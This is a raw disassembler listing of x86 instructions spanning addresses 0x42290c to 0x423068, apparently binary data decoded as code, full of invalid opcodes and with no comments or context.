  42290c:	add    BYTE PTR [eax],al
  42290e:	add    BYTE PTR [eax],al
  422910:	add    BYTE PTR [eax],al
  422912:	add    dl,BYTE PTR ss:[ebp+0xc]
  422916:	jne    0x422977
  422918:	jg     0x422954
  42291a:	clc    
  42291b:	cs aas 
  42291d:	push   0x61a8d416
  422922:	and    eax,0x620001d0
  422927:	add    BYTE PTR [eax],al
  422929:	add    BYTE PTR [edi],bl
  42292b:	xor    dl,bl
  42292d:	mov    ecx,0xce4b3734
  422932:	in     eax,dx
  422933:	test   al,0x47
  422935:	jb     0x4228ee
  422937:	jge    0x4228da
  422939:	push   es
  42293a:	sub    eax,0xbe0477db
  42293f:	stos   BYTE PTR es:[edi],al
  422940:	inc    eax
  422941:	fldpi  
  422943:	ds jg  0x4229a8
  422946:	jp     0x422902
  422948:	sti    
  422949:	fwait
  42294a:	(bad)  
  42294c:	xchg   edx,eax
  42294d:	popf   
  42294e:	xchg   ebx,eax
  42294f:	scas   eax,DWORD PTR es:[edi]
  422950:	pop    ds
  422951:	mov    edx,0x19de707c
  422956:	out    0x34,eax
  422958:	lea    ecx,[edx]
  42295a:	xchg   DWORD PTR [edx+0xd4a40b8],edi
  422960:	lahf   
  422961:	mov    cl,0x47
  422963:	ins    BYTE PTR es:[edi],dx
  422964:	mov    eax,0x1d008241
  422969:	sbb    ah,BYTE PTR [ebp+0x4fbd034e]
  42296f:	fild   QWORD PTR [esi+0x44]
  422972:	lods   al,BYTE PTR ds:[esi]
  422973:	outs   dx,DWORD PTR ds:[esi]
  422974:	shl    BYTE PTR [edx-0x53],1
  422977:	inc    eax
  422978:	jp     0x422955
  42297a:	inc    ecx
  42297b:	xchg   edi,eax
  42297c:	sub    dl,dh
  42297e:	jo     0x42292e
  422980:	pop    edi
  422981:	adc    DWORD PTR ds:0x385d548,esi
  422987:	sbb    DWORD PTR [eax],0x70134b
  42298d:	add    BYTE PTR [eax],al
  42298f:	add    BYTE PTR [eax],al
  422991:	add    BYTE PTR [eax],cl
  422993:	mov    cl,0x72
  422995:	cmp    edi,ebx
  422997:	sti    
  422998:	dec    ecx
  422999:	mov    bl,0x94
  42299b:	je     0x422974
  42299d:	call   0xd087:0x295d4d2b
  4229a4:	add    DWORD PTR [eax],eax
  4229a6:	bound  eax,QWORD PTR [eax]
  4229a8:	add    BYTE PTR [eax],al
  4229aa:	and    edi,DWORD PTR [edi+eiz*4-0x2df1983]
  4229b1:	das    
  4229b2:	mov    edx,0x43fb6c31
  4229b7:	jg     0x4229f0
  4229b9:	cmp    al,0x6a
  4229bb:	xor    al,bl
  4229bd:	push   ss
  4229be:	mov    ebx,0xa7ea464b
  4229c3:	push   esi
  4229c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4229c5:	sub    ch,BYTE PTR [ebx+0xe76cf8f]
  4229cb:	and    al,0xbf
  4229cd:	or     esi,DWORD PTR [ebx]
  4229cf:	and    BYTE PTR [ebx+0x6d],dl
  4229d2:	and    al,0x7b
  4229d4:	push   0xffffffd1
  4229d6:	add    al,0xd4
  4229d8:	cmp    edx,esi
  4229da:	mov    ecx,0x119a76d7
  4229df:	mov    edi,0x60d4662b
  4229e4:	jmp    0x4229f2
  4229e6:	add    eax,0x52975e00
  4229eb:	outs   dx,DWORD PTR ds:[esi]
  4229ec:	pop    esi
  4229ed:	pop    ebx
  4229ee:	out    0x71,al
  4229f0:	push   esi
  4229f1:	ds int3 
  4229f3:	cli    
  4229f4:	and    bl,BYTE PTR [ecx]
  4229f6:	dec    eax
  4229f7:	jl     0x4229a6
  4229f9:	mov    ds:0x1ee1e0e0,al
  4229fe:	ret    
  4229ff:	mov    dh,0x1e
  422a01:	or     eax,0xfcf4108f
  422a06:	mov    esi,DWORD PTR [eax+0x46]
  422a09:	retf   
  422a0a:	mov    eax,0x14
  422a0f:	add    BYTE PTR [eax],al
  422a11:	add    bh,bl
  422a13:	push   ebx
  422a14:	mov    dl,0x4f
  422a16:	mov    esi,0x67d3ffef
  422a1b:	xchg   ecx,edi
  422a1d:	adc    al,0xe9
  422a1f:	(bad)  
  422a20:	cmp    BYTE PTR [edx+0x1d0e9],dh
  422a26:	bound  eax,QWORD PTR [eax]
  422a28:	add    BYTE PTR [eax],al
  422a2a:	aam    0xfe
  422a2c:	xchg   ebx,eax
  422a2d:	jge    0x422a66
  422a2f:	dec    ecx
  422a30:	mov    ebx,0xf4131db
  422a35:	mov    ebx,0x309441dc
  422a3a:	and    edx,DWORD PTR [edx+0xd]
  422a3d:	ja     0x4229e1
  422a3f:	pop    eax
  422a40:	fwait
  422a41:	stos   DWORD PTR es:[edi],eax
  422a42:	enter  0x8f53,0xf4
  422a46:	ffreep st(3)
  422a48:	jno    0x422a16
  422a4a:	aas    
  422a4b:	jmp    0x142890a5
  422a50:	mov    ah,0xf7
  422a52:	pop    ds
  422a53:	push   edi
  422a54:	xor    bl,BYTE PTR [ebx+0x54aae8f6]
  422a5a:	jnp    0x422a49
  422a5c:	out    0x88,eax
  422a5e:	push   esi
  422a5f:	hlt    
  422a60:	pop    esp
  422a61:	cdq    
  422a62:	out    dx,al
  422a63:	sub    BYTE PTR [edi-0x5d],bh
  422a66:	fstp   TBYTE PTR [esi+esi*1+0x25]
  422a6a:	cmp    BYTE PTR [esi+edx*4],0x94
  422a6e:	adc    eax,0xce98c0ae
  422a73:	fmul   QWORD PTR [ecx]
  422a75:	xlat   BYTE PTR ds:[ebx]
  422a76:	jle    0x422a7e
  422a78:	xchg   ebx,eax
  422a79:	outs   dx,DWORD PTR ds:[esi]
  422a7a:	dec    eax
  422a7b:	rol    DWORD PTR [edx+0x1a],1
  422a7e:	sub    cl,dh
  422a80:	or     al,0x36
  422a82:	jne    0x422a09
  422a84:	mov    esp,0x879ab49a
  422a89:	in     al,dx
  422a8a:	cdq    
  422a8b:	add    eax,DWORD PTR [eax]
  422a8d:	add    BYTE PTR [eax],al
  422a8f:	add    BYTE PTR [eax],al
  422a91:	add    BYTE PTR [edi-0x24252cf4],al
  422a97:	fisttp WORD PTR [edi+0x640ccb5d]
  422a9d:	push   ss
  422a9e:	pop    es
  422a9f:	and    cl,BYTE PTR [edi+0x39]
  422aa2:	dec    ebx
  422aa3:	rol    DWORD PTR [ecx],1
  422aa5:	add    BYTE PTR [edx+0x0],ah
  422aa8:	add    BYTE PTR [eax],al
  422aaa:	push   edi
  422aab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422aac:	xor    BYTE PTR [ecx-0x1789d2bc],bl
  422ab2:	dec    esi
  422ab3:	xor    eax,0x8d96dc8
  422ab8:	sub    cl,BYTE PTR es:[ebx]
  422abb:	fldcw  WORD PTR [edx]
  422abd:	leave  
  422abe:	lods   eax,DWORD PTR ds:[esi]
  422abf:	add    eax,0x9112c779
  422ac4:	xor    edx,ebx
  422ac6:	fs cs ins BYTE PTR es:[edi],dx
  422ac9:	mov    edx,0xa832a534
  422ace:	cmp    esp,ebp
  422ad0:	and    dh,cl
  422ad2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ad3:	ins    DWORD PTR es:[edi],dx
  422ad4:	daa    
  422ad5:	mov    ds:0x47daa0c3,eax
  422ada:	mov    bl,0x4b
  422adc:	clc    
  422add:	not    BYTE PTR [ecx]
  422adf:	(bad)  
  422ae2:	mov    al,ds:0x91424985
  422ae7:	adc    eax,0x77835469
  422aec:	stc    
  422aed:	(bad)  
  422aee:	iret   
  422aef:	dec    edi
  422af0:	sub    DWORD PTR [edi],eax
  422af2:	les    esp,FWORD PTR [edi+0x2e]
  422af5:	or     al,BYTE PTR [esi-0x28be0693]
  422afb:	imul   ecx,DWORD PTR [edi+0x10],0x51916b5d
  422b02:	mov    eax,DWORD PTR [esi+0x47fb3a6f]
  422b08:	and    edx,DWORD PTR [esi+0x35]
  422b0b:	fild   DWORD PTR [eax]
  422b0d:	add    BYTE PTR [eax],al
  422b0f:	add    BYTE PTR [eax],al
  422b11:	add    BYTE PTR [edi-0x28db29d],bl
  422b17:	jle    0x422ad8
  422b19:	out    dx,eax
  422b1a:	sbb    edi,esp
  422b1c:	mov    BYTE PTR [ecx+ebp*8-0x528335ba],dh
  422b23:	rol    DWORD PTR [ecx],1
  422b25:	add    BYTE PTR [edx+0x0],ah
  422b28:	add    BYTE PTR [eax],al
  422b2a:	in     al,dx
  422b2b:	out    dx,eax
  422b2c:	cmc    
  422b2d:	hlt    
  422b2e:	aam    0x8a
  422b30:	fs cli 
  422b32:	adc    dl,BYTE PTR [eax-0x7543e16a]
  422b38:	imul   ebx,edi,0xb6e35781
  422b3e:	or     BYTE PTR [ecx+0x21fac131],al
  422b44:	pop    ebp
  422b45:	mov    ecx,0x816dedc6
  422b4a:	scas   al,BYTE PTR es:[edi]
  422b4b:	cmp    eax,0x160773e8
  422b50:	pop    ss
  422b51:	imul   ebx,DWORD PTR [ebp-0xd],0xbb5dbf78
  422b58:	aas    
  422b59:	jecxz  0x422ae6
  422b5b:	jp     0x422b23
  422b5d:	push   es
  422b5e:	push   ebx
  422b5f:	xchg   esp,eax
  422b60:	bound  ebx,QWORD PTR [edx]
  422b62:	outs   dx,BYTE PTR ds:[esi]
  422b63:	adc    BYTE PTR [edx-0x54],bh
  422b66:	outs   dx,DWORD PTR ds:[esi]
  422b67:	icebp  
  422b68:	add    eax,0xb4c25672
  422b6d:	jp     0x422b8f
  422b6f:	cs jae 0x422b0d
  422b72:	and    eax,0xfe889517
  422b77:	jne    0x422be0
  422b79:	repnz mov eax,esp
  422b7c:	clc    
  422b7d:	xchg   DWORD PTR [edx],esp
  422b7f:	sbb    ch,cl
  422b81:	retf   
  422b82:	stos   BYTE PTR es:[edi],al
  422b83:	ds inc dx
  422b86:	pop    ss
  422b87:	in     eax,dx
  422b88:	push   ebx
  422b89:	and    DWORD PTR ds:0x5b,edx
  422b8f:	add    BYTE PTR [eax],al
  422b91:	add    BYTE PTR [eax+0x23],dh
  422b94:	and    eax,0x7c6f7769
  422b99:	cmp    esp,DWORD PTR [eax-0x464311e4]
  422b9f:	push   esi
  422ba0:	stos   DWORD PTR es:[edi],eax
  422ba1:	hlt    
  422ba2:	psrld  mm0,QWORD PTR [ecx]
  422ba5:	add    BYTE PTR [edx+0x0],ah
  422ba8:	add    BYTE PTR [eax],al
  422baa:	in     eax,0x4b
  422bac:	sbb    ebx,edi
  422bae:	rcl    DWORD PTR [ebx-0x5d],0x35
  422bb2:	or     BYTE PTR [esi+ecx*1],ch
  422bb5:	xchg   edi,eax
  422bb6:	idiv   BYTE PTR [eax+0x37]
  422bb9:	call   0xd1cd:0x8f930965
  422bc0:	add    DWORD PTR [ebp-0x2a],eax
  422bc3:	xor    DWORD PTR [ebx+0x14],ebp
  422bc6:	pop    WORD PTR gs:[edi+0x64]
  422bcb:	out    dx,al
  422bcc:	or     eax,0xf0708cfa
  422bd1:	mov    fs,WORD PTR [edx]
  422bd3:	xchg   esi,eax
  422bd4:	nop
  422bd5:	dec    ecx
  422bd6:	push   esp
  422bd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422bd8:	in     al,0x28
  422bda:	jl     0x422b91
  422bdc:	mov    al,ds:0xde427d7b
  422be1:	imul   ebp,eax,0x56
  422be4:	arpl   WORD PTR [ebp+0x1a],sp
  422be7:	test   eax,0x52f3daca
  422bec:	pushf  
  422bed:	xor    bh,BYTE PTR [ebx]
  422bef:	or     DWORD PTR [eax],eax
  422bf1:	sar    BYTE PTR [edi+ebp*8],0x9b
  422bf5:	fstp   DWORD PTR [esi+ecx*4]
  422bf8:	xchg   ecx,eax
  422bf9:	cmp    ecx,DWORD PTR [esp+ebp*8]
  422bfc:	ds and eax,0x7a897f8c
  422c02:	xchg   ebp,eax
  422c03:	dec    ebp
  422c04:	test   BYTE PTR [edi],dl
  422c06:	mov    edi,0xddaee183
  422c0b:	dec    ebx
  422c0c:	add    BYTE PTR [eax],al
  422c0e:	add    BYTE PTR [eax],al
  422c10:	add    BYTE PTR [eax],al
  422c12:	xchg   esp,eax
  422c13:	nop
  422c14:	ffree  st(0)
  422c16:	(bad)  
  422c18:	popf   
  422c19:	aam    0x57
  422c1b:	(bad)
  422c1f:	dec    eax
  422c20:	sbb    dl,ah
  422c22:	jno    0x422bf6
  422c24:	add    DWORD PTR [eax],eax
  422c26:	bound  eax,QWORD PTR [eax]
  422c28:	add    BYTE PTR [eax],al
  422c2a:	js     0x422c4e
  422c2c:	scas   eax,DWORD PTR es:[edi]
  422c2d:	xchg   ebp,eax
  422c2e:	push   es
  422c2f:	lock dec edx
  422c31:	mov    edi,0x9f85943e
  422c36:	call   0x9a67aa2f
  422c3b:	jl     0x422c78
  422c3d:	add    DWORD PTR [edi+0x3d],ebx
  422c40:	ror    eax,0x53
  422c43:	(bad)  
  422c45:	or     cl,BYTE PTR [ecx]
  422c47:	imul   esp,DWORD PTR [esi+0x1b],0x4f
  422c4b:	test   al,0x8a
  422c4d:	ret    0x3a9d
  422c50:	(bad)  
  422c51:	retf   
  422c52:	jb     0x422c0e
  422c54:	out    dx,al
  422c55:	fisttp QWORD PTR ds:0x3f455243
  422c5b:	aas    
  422c5c:	and    bl,BYTE PTR [esi+0x74]
  422c5f:	sub    al,0x6c
  422c61:	es (bad) 
  422c63:	jb     0x422c3a
  422c65:	retf   
  422c66:	xlat   BYTE PTR ds:[ebx]
  422c67:	sub    al,0x45
  422c69:	sub    edx,DWORD PTR [ebx]
  422c6b:	test   BYTE PTR [ecx+0x5d],ch
  422c6e:	mov    ch,0x4e
  422c70:	jbe    0x422c87
  422c72:	sar    BYTE PTR [edi-0x322b1979],cl
  422c78:	out    dx,al
  422c79:	and    DWORD PTR [edi-0xb],0xced95fe0
  422c80:	cmc    
  422c81:	xor    esp,DWORD PTR [eax+0x2d]
  422c84:	adc    al,0x18
  422c86:	pop    eax
  422c87:	sbb    al,BYTE PTR ds:0x4026f3
  422c8d:	add    BYTE PTR [eax],al
  422c8f:	add    BYTE PTR [eax],al
  422c91:	add    ah,dh
  422c93:	mov    dl,0x32
  422c95:	(bad)  
  422c96:	jbe    0x422c6e
  422c98:	hlt    
  422c99:	mov    dl,0xb1
  422c9b:	and    al,0xfe
  422c9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c9e:	in     al,0xe7
  422ca0:	call   0x214ffd0
  422ca5:	add    BYTE PTR [edx+0x0],ah
  422ca8:	add    BYTE PTR [eax],al
  422caa:	addr16 cmp al,0xa
  422cad:	adc    DWORD PTR [ebx+esi*2-0x62],esp
  422cb1:	push   es
  422cb2:	or     eax,0x7c193eaf
  422cb7:	or     ah,BYTE PTR [edi]
  422cb9:	aas    
  422cba:	mov    bh,0x65
  422cbc:	sbb    eax,0x40fe6a16
  422cc1:	fdiv   DWORD PTR [ecx+edx*2-0x6ae90b77]
  422cc8:	test   DWORD PTR [eax+edx*1],edi
  422ccb:	adc    ebx,ebp
  422ccd:	or     eax,0xb79fbe91
  422cd2:	mov    DWORD PTR [ecx],ebp
  422cd4:	lods   eax,DWORD PTR ds:[esi]
  422cd5:	sbb    bl,BYTE PTR [ebx-0x3e815bb7]
  422cdb:	aaa    
  422cdc:	call   0xb78e:0xadf1c972
  422ce3:	add    al,0xe5
  422ce5:	jb     0x422cc1
  422ce7:	call   0x3c9e5299
  422cec:	pop    ebp
  422ced:	and    eax,0xbb3f4535
  422cf2:	hlt    
  422cf3:	or     al,0x4c
  422cf5:	push   ds
  422cf6:	push   esi
  422cf7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422cf8:	popa   
  422cf9:	add    al,0xd3
  422cfb:	add    bh,dl
  422cfd:	fcomp  st(7)
  422cff:	pop    dx
  422d01:	jge    0x422d47
  422d03:	push   ecx
  422d04:	xor    BYTE PTR [esi-0x4f],bh
  422d07:	jmp    0x0:0xe35d93b9
  422d0e:	add    BYTE PTR [eax],al
  422d10:	add    BYTE PTR [eax],al
  422d12:	xor    dl,bl
  422d14:	into   
  422d15:	mov    ds:0xd37ebfef,al
  422d1a:	sub    edi,DWORD PTR [esi]
  422d1c:	out    0x3f,eax
  422d1e:	rcr    BYTE PTR [eax+ebp*8],0xc6
  422d22:	xor    eax,0x620001d3
  422d27:	add    BYTE PTR [eax],al
  422d29:	add    bl,ch
  422d2b:	pop    esp
  422d2c:	or     al,0xcc
  422d2e:	lods   al,BYTE PTR ds:[esi]
  422d2f:	jns    0x422d92
  422d31:	add    eax,0xc86b3905
  422d36:	sar    ebp,cl
  422d38:	push   es
  422d39:	pop    ebp
  422d3a:	xlat   BYTE PTR ds:[ebx]
  422d3b:	pop    ds
  422d3c:	stos   DWORD PTR es:[edi],eax
  422d3d:	repz pop esp
  422d3f:	aaa    
  422d40:	(bad)  
  422d41:	sub    cl,BYTE PTR [edx-0x4b6190e5]
  422d47:	add    DWORD PTR [ebp+0x6c],ecx
  422d4a:	ret    0xac90
  422d4d:	fs cwde 
  422d4f:	jmp    0xf1db:0xe7d23752
  422d56:	mov    ebp,0x65a3b18f
  422d5b:	fist   DWORD PTR [edx]
  422d5d:	daa    
  422d5e:	repz mov ?,WORD PTR [esi]
  422d61:	retf   0xa943
  422d64:	jne    0x422d03
  422d66:	div    DWORD PTR [esi+0x5]
  422d69:	lea    ecx,ds:0x96d93041
  422d6f:	in     al,0xf9
  422d71:	jae    0x422d99
  422d73:	or     ecx,DWORD PTR [ebx+esi*4-0x68]
  422d77:	jae    0x422d86
  422d79:	mov    ah,0x47
  422d7b:	and    bl,BYTE PTR [esi+0x16]
  422d7e:	test   al,0x58
  422d80:	push   edi
  422d81:	xor    dh,BYTE PTR [edi+0x5e]
  422d84:	inc    ebx
  422d85:	scas   eax,DWORD PTR es:[edi]
  422d86:	jg     0x422dfd
  422d88:	aad    0x65
  422d8a:	data16 fild WORD PTR [eax]
  422d8d:	add    BYTE PTR [eax],al
  422d8f:	add    BYTE PTR [eax],al
  422d91:	add    bl,bl
  422d93:	in     eax,dx
  422d94:	outs   dx,BYTE PTR ds:[esi]
  422d95:	and    bh,BYTE PTR [esi-0x5d]
  422d98:	(bad)  
  422d9a:	pop    esi
  422d9b:	(bad)  
  422d9c:	mov    DWORD PTR [ebp-0x1d773d63],ecx
  422da2:	xchg   edi,eax
  422da3:	rol    DWORD PTR [ecx],cl
  422da5:	add    BYTE PTR [edx+0x0],ah
  422da8:	add    BYTE PTR [eax],al
  422daa:	shr    DWORD PTR [ebx+edi*2],1
  422dad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422dae:	pop    es
  422daf:	cmp    ebp,DWORD PTR [esi-0x67c40b37]
  422db5:	(bad)  
  422db7:	mov    dl,0x2d
  422db9:	inc    esp
  422dba:	cmp    BYTE PTR [eax-0x264db43d],ch
  422dc0:	les    ebp,FWORD PTR [ecx]
  422dc2:	sbb    ebx,DWORD PTR [ecx-0x9ee25c6]
  422dc8:	loop   0x422dd5
  422dca:	ins    DWORD PTR es:[edi],dx
  422dcb:	mov    ebx,0x12b0711c
  422dd0:	push   edx
  422dd1:	dec    esi
  422dd2:	add    edi,DWORD PTR [ebp-0x7c]
  422dd5:	push   0xffffffe5
  422dd7:	mov    edi,DWORD PTR ds:0xa54f2924
  422ddd:	mov    DWORD PTR [ecx+0x58],ecx
  422de0:	mov    dh,0x2c
  422de2:	xchg   esp,eax
  422de3:	sub    al,0x20
  422de5:	inc    edx
  422de6:	xchg   BYTE PTR [esi+ecx*4-0x2d],cl
  422dea:	pop    edx
  422deb:	push   es
  422dec:	add    al,0xe
  422dee:	xchg   ebx,eax
  422def:	xor    BYTE PTR [edi+0x3cce68eb],bl
  422df5:	cld    
  422df6:	sub    al,0x1d
  422df8:	pop    esp
  422df9:	icebp  
  422dfa:	jbe    0x422e44
  422dfc:	push   0xffffffc9
  422dfe:	shr    ebx,0xe
  422e01:	fcom   DWORD PTR [edx-0x4]
  422e04:	sub    eax,0x8cc0e3ca
  422e09:	rcl    DWORD PTR [edi+esi*1],cl
  422e0c:	add    BYTE PTR [eax],al
  422e0e:	add    BYTE PTR [eax],al
  422e10:	add    BYTE PTR [eax],al
  422e12:	add    eax,0x6f976b22
  422e17:	(bad)  
  422e19:	mov    dl,0x66
  422e1b:	and    BYTE PTR [esi+0x138b936a],ah
  422e21:	cmp    cl,0xd3
  422e24:	add    DWORD PTR [eax],eax
  422e26:	bound  eax,QWORD PTR [eax]
  422e28:	add    BYTE PTR [eax],al
  422e2a:	or     ah,BYTE PTR [ebx-0x2]
  422e2d:	pop    ds
  422e2e:	bound  ebx,QWORD PTR [eax]
  422e30:	mov    ss,edx
  422e32:	out    0xbe,eax
  422e34:	int3   
  422e35:	mov    edi,0xed5c1dc6
  422e3a:	push   ds
  422e3b:	sahf   
  422e3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e3d:	push   0xbd0cca92
  422e42:	daa    
  422e43:	(bad)  [ecx]
  422e45:	nop
  422e46:	mov    WORD PTR [edx],fs
  422e48:	push   0x68
  422e4a:	adc    DWORD PTR ds:0xfe370975,0xffffffe9
  422e51:	stos   DWORD PTR es:[edi],eax
  422e52:	sbb    eax,0xd1771fa1
  422e57:	and    DWORD PTR [ecx+0x73],esi
  422e5a:	and    eax,0x40a34398
  422e5f:	cmc    
  422e60:	nop
  422e61:	rcl    DWORD PTR [ecx-0x65889731],0xfd
  422e68:	fs sahf 
  422e6a:	push   ebp
  422e6b:	sub    al,BYTE PTR [ecx+0x4c]
  422e6e:	repnz pop eax
  422e70:	out    dx,eax
  422e71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e73:	lock dec edx
  422e75:	inc    esi
  422e76:	sbb    eax,0x9bc0d3b6
  422e7b:	mov    ds:0xb1b325d4,al
  422e80:	adc    edx,edi
  422e82:	and    eax,DWORD PTR [ecx+0x6e]
  422e85:	xchg   ebx,eax
  422e86:	xor    ah,BYTE PTR [esi-0x6e7197de]
  422e8c:	add    BYTE PTR [eax],al
  422e8e:	add    BYTE PTR [eax],al
  422e90:	add    BYTE PTR [eax],al
  422e92:	mov    edx,esp
  422e94:	and    al,0xd9
  422e96:	jg     0x422e91
  422e98:	call   esi
  422e9a:	into   
  422e9b:	inc    ebp
  422e9c:	mov    bh,0x11
  422e9e:	dec    edx
  422e9f:	mov    al,0x25
  422ea1:	mov    edx,0x1d45b
  422ea6:	bound  eax,QWORD PTR [eax]
  422ea8:	add    BYTE PTR [eax],al
  422eaa:	fimul  DWORD PTR [ebx-0x2f]
  422ead:	retf   
  422eae:	cs jae 0x422efe
  422eb1:	loopne 0x422e75
  422eb3:	cmp    BYTE PTR [esi+0x7f62af5c],dl
  422eb9:	fwait
  422eba:	ins    DWORD PTR es:[edi],dx
  422ebb:	cs int 0x97
  422ebe:	add    al,0xe4
  422ec0:	sar    DWORD PTR [ebx+0x6a],cl
  422ec3:	xchg   esi,eax
  422ec4:	js     0x422e62
  422ec6:	scas   eax,DWORD PTR es:[edi]
  422ec7:	lahf   
  422ec8:	lahf   
  422ec9:	cld    
  422eca:	(bad)
  422ecd:	test   al,0xf6
  422ecf:	ins    BYTE PTR es:[edi],dx
  422ed0:	jge    0x422f50
  422ed2:	imul   esp,DWORD PTR [esi-0x40d552c2],0x78d1447e
  422edc:	leave  
  422edd:	lods   al,BYTE PTR ds:[esi]
  422ede:	lods   eax,DWORD PTR ds:[esi]
  422edf:	rcr    BYTE PTR [edi-0x6a],0x2f
  422ee3:	pop    ds
  422ee4:	pop    ds
  422ee5:	mov    edi,0x5c04dedf
  422eea:	imul   edx,DWORD PTR [edi],0xffffffbc
  422eed:	ja     0x422f29
  422eef:	push   eax
  422ef0:	test   DWORD PTR [edx-0x33],edi
  422ef3:	fdivrp st(6),st
  422ef5:	(bad)  
  422ef6:	jl     0x422f6f
  422ef8:	in     eax,0x19
  422efa:	daa    
  422efb:	(bad)  
  422efd:	mov    cl,0xbd
  422eff:	lahf   
  422f00:	mov    eax,ds:0x5b0d0dc1
  422f05:	call   0x426c:0x6452e660
  422f0c:	add    BYTE PTR [eax],al
  422f0e:	add    BYTE PTR [eax],al
  422f10:	add    BYTE PTR [eax],al
  422f12:	fisubr WORD PTR [ecx]
  422f14:	cwde   
  422f15:	sar    bh,cl
  422f17:	repz fisubr WORD PTR ds:0x4af35f6
  422f1e:	icebp  
  422f1f:	push   0x2c
  422f21:	mov    bp,0x1d4
  422f25:	add    BYTE PTR [edx+0x0],ah
  422f28:	add    BYTE PTR [eax],al
  422f2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f2b:	inc    ebp
  422f2c:	je     0x422eec
  422f2e:	cmp    eax,0x4bcf9851
  422f33:	stos   DWORD PTR es:[edi],eax
  422f34:	rsqrtps xmm2,xmm5
  422f37:	mov    BYTE PTR [edi+0x5c],cl
  422f3a:	adc    eax,0x785b38b5
  422f3f:	dec    ebp
  422f40:	xor    eax,0x2704c015
  422f45:	jb     0x422f1b
  422f47:	jmp    0x422f65
  422f49:	xchg   edx,eax
  422f4a:	mov    dh,0x96
  422f4c:	lock in al,0x69
  422f4f:	or     DWORD PTR [edx],ebp
  422f51:	mov    dl,0x8
  422f53:	mov    al,ds:0x6ca1578f
  422f58:	sbb    eax,0xda9637a6
  422f5d:	sub    al,0x6
  422f5f:	mov    bl,0xcd
  422f61:	lods   eax,DWORD PTR ds:[esi]
  422f62:	xor    bl,BYTE PTR [ebx]
  422f64:	xlat   BYTE PTR ds:[ebx]
  422f65:	cld    
  422f66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f67:	pop    edi
  422f68:	mov    dl,0x68
  422f6a:	xchg   edi,eax
  422f6b:	retf   0x5e8a
  422f6e:	loope  0x422f44
  422f70:	in     al,0x9
  422f72:	clc    
  422f73:	rep stos DWORD PTR es:[edi],eax
  422f75:	in     eax,0xf7
  422f77:	and    eax,0xa8bed7ac
  422f7c:	push   0x19
  422f7e:	lods   eax,DWORD PTR ds:[esi]
  422f7f:	sub    dl,BYTE PTR [ebp+edx*2-0x1c932da4]
  422f86:	add    dl,bh
  422f88:	iret   
  422f89:	aaa    
  422f8a:	add    dl,BYTE PTR [edi+0x0]
  422f8d:	add    BYTE PTR [eax],al
  422f8f:	add    BYTE PTR [eax],al
  422f91:	add    BYTE PTR [esi+0x3f],cl
  422f94:	int3   
  422f95:	sbb    eax,0x7fdffffd
  422f9a:	out    dx,eax
  422f9b:	loopne 0x422fb3
  422f9d:	lods   al,BYTE PTR ds:[esi]
  422f9e:	inc    edi
  422f9f:	imul   ecx,DWORD PTR [edi+0x5d],0x1f
  422fa3:	aad    0x1
  422fa5:	add    BYTE PTR [edx+0x0],ah
  422fa8:	add    BYTE PTR [eax],al
  422faa:	xchg   esi,eax
  422fab:	ins    BYTE PTR es:[edi],dx
  422fac:	dec    esi
  422fad:	add    eax,0x2bcb80e5
  422fb2:	into   
  422fb3:	cmc    
  422fb4:	inc    ebp
  422fb5:	int    0xd4
  422fb7:	push   cs
  422fb8:	int3   
  422fb9:	xchg   edx,esi
  422fbb:	jl     0x422f90
  422fbd:	mov    cs,WORD PTR [ebx+0x4fbb5e33]
  422fc3:	imul   ebp,DWORD PTR [ecx+0x60e01f02],0x3d8e59c4
  422fcd:	push   edx
  422fce:	push   edx
  422fcf:	cld    
  422fd0:	cwde   
  422fd1:	jmp    0x1b6d2a68
  422fd6:	pop    es
  422fd7:	test   BYTE PTR [ecx+edi*2-0x12],ch
  422fdb:	in     al,0x33
  422fdd:	inc    edi
  422fde:	outs   dx,DWORD PTR ds:[esi]
  422fdf:	imul   BYTE PTR [ebp+0x7c1b68f9]
  422fe5:	fnstcw WORD PTR [edx+edx*4+0xb]
  422fe9:	aas    
  422fea:	mov    edx,0x6af4ab1a
  422fef:	ficomp DWORD PTR [ebx]
  422ff1:	fstp   QWORD PTR [esi+0x41]
  422ff4:	sub    BYTE PTR [esi-0x1c],al
  422ff7:	xchg   ecx,eax
  422ff8:	mov    ds:0x714c177e,eax
  422ffd:	shl    WORD PTR [ebx+eax*1-0x2c],0x42
  423003:	jmp    0x422fb4
  423005:	js     0x422fc9
  423007:	and    DWORD PTR [eax],edi
  423009:	(bad)  
  42300a:	fcmovnbe st,st(7)
  42300c:	add    BYTE PTR [eax],al
  42300e:	add    BYTE PTR [eax],al
  423010:	add    BYTE PTR [eax],al
  423012:	push   ds
  423013:	test   eax,0x7ff735f6
  423018:	fild   QWORD PTR [ebx-0x5f9ed871]
  42301e:	jle    0x422fc5
  423020:	(bad)  
  423021:	adc    eax,0x1d581
  423026:	bound  eax,QWORD PTR [eax]
  423028:	add    BYTE PTR [eax],al
  42302a:	mov    bl,0xeb
  42302c:	stos   DWORD PTR es:[edi],eax
  42302d:	adc    BYTE PTR [eax-0x16],dl
  423030:	mov    al,ds:0xe687caa1
  423035:	dec    ebp
  423036:	fwait
  423037:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423038:	out    dx,al
  423039:	jge    0x423067
  42303b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42303c:	dec    eax
  42303d:	push   ebp
  42303e:	push   ds
  42303f:	xor    edi,DWORD PTR [ecx+0x7c047439]
  423045:	(bad)  
  423046:	jbe    0x423069
  423048:	aas    
  423049:	jnp    0x423082
  42304b:	(bad)  
  42304c:	mov    dh,0xb3
  42304e:	add    ah,BYTE PTR [edx+eiz*8]
  423051:	loop   0x422ffa
  423053:	adc    DWORD PTR [esi-0x53dbe9e6],edx
  423059:	sbb    DWORD PTR fs:[esi+esi*8+0x5bd6ccd9],ebx
  423061:	xchg   ebx,eax
  423062:	and    DWORD PTR ds:0x7b8265d2,edi
  423068:	mov    cl,0xae
